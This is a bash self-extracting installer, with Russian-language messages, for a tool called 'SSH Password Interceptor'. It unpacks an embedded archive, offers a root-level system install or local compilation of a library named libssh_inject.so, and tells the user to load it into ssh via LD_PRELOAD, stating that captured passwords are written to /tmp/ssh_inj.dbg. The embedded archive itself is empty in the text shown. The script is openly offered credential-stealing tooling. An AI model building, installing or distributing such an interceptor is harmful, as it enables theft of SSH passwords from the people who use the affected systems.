#!/bin/bash

VERSION="1.1.0"
TMP_DIR=$(mktemp -d)
trap 'rm -rf $TMP_DIR' EXIT

echo "==========================================="
echo "    SSH Password Interceptor v$VERSION"
echo "         Linux-only Edition"
echo "==========================================="
echo ""

# Извлекаем содержимое архива
ARCHIVE_MARKER="__ARCHIVE_BELOW__"
LINE=$(grep -an "^$ARCHIVE_MARKER" "$0" | cut -d: -f1)
if [ -z "$LINE" ]; then
    echo "Ошибка: архив не найден в установщике"
    exit 1
fi

ARCHIVE_START=$((LINE + 1))
tail -n +$ARCHIVE_START "$0" | tar xz -C "$TMP_DIR"
if [ $? -ne 0 ]; then
    echo "Ошибка: не удалось распаковать архив"
    exit 1
fi

echo "Файлы распакованы в временный каталог"
echo ""

# Проверяем, что мы на Linux
if [ "$(uname -s)" != "Linux" ]; then
    echo "Ошибка: этот установщик работает только на Linux"
    echo "Вы используете: $(uname -s)"
    exit 1
fi

cd "$TMP_DIR"

echo "Выберите действие:"
echo "1) Установить системно (требуются права root)"
echo "2) Скомпилировать локально для текущего пользователя"
echo "3) Распаковать файлы в текущий каталог"
echo "4) Выход"
read -p "Выбор [1-4]: " CHOICE

case "$CHOICE" in
    1)
        # Проверка прав root
        if [ "$(id -u)" -ne 0 ]; then
            echo "Для системной установки требуются права root."
            echo "Запустите скрипт с sudo:"
            echo "sudo $0"
            exit 1
        fi
        
        echo "Запуск системной установки..."
        chmod +x installer.sh
        ./installer.sh
        ;;
        
    2)
        echo "Компиляция библиотеки локально..."
        chmod +x compile.sh
        ./compile.sh
        
        if [ -f "libssh_inject.so" ]; then
            echo ""
            echo "Библиотека успешно скомпилирована!"
            echo "Для использования библиотеки выполните команду:"
            echo "LD_PRELOAD=\$PWD/libssh_inject.so ssh user@host"
            echo ""
            echo "Пароли будут сохранены в файле: /tmp/ssh_inj.dbg"
            
            # Копируем библиотеку в текущий каталог
            cp "libssh_inject.so" "$PWD/"
            echo "Библиотека скопирована в: $PWD/libssh_inject.so"
        else
            echo "Ошибка: не удалось скомпилировать библиотеку"
            exit 1
        fi
        ;;
        
    3)
        echo "Распаковка файлов в текущий каталог..."
        cp -r "$TMP_DIR"/* "$PWD/"
        chmod +x "$PWD/compile.sh" "$PWD/installer.sh" "$PWD/uninstall.sh"
        echo "Файлы распакованы в: $PWD"
        echo "Для компиляции выполните: ./compile.sh"
        echo "Для установки выполните: sudo ./installer.sh"
        ;;
        
    4)
        echo "Выход без установки"
        exit 0
        ;;
        
    *)
        echo "Неверный выбор"
        exit 1
        ;;
esac

echo "Спасибо за использование SSH Password Interceptor!"
exit 0

# Архив tar начинается ниже этой линии
__ARCHIVE_BELOW__ 